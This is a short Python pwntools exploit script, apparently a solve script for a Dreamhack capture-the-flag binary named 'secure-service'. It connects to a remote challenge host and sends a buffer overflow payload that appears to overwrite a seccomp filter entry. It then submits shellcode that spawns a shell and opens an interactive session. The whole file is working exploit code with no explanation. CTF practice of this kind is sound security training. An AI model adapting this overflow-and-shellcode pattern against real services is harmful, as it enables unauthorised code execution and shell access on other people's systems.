#!/usr/bin/env python3

from pwn import *

exe = ELF("./secure-service")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 8593)

    return r


def main():
    r = conn()

    payload = b"A" * 128
    payload += b"\x06\x00\x00\x00\x00\x00\xFF\x7F" * 3
    payload += b"A" * 104
    payload += p64(2)

    r.sendlineafter(b"which method? ", b"bof")
    r.sendlineafter(b"payload: ", payload)

    shellcode = asm(shellcraft.sh())
    r.sendlineafter(b"which method? ", b"shellcode")
    r.sendlineafter(b"shellcode: ", shellcode)

    r.interactive()


if __name__ == "__main__":
    main()
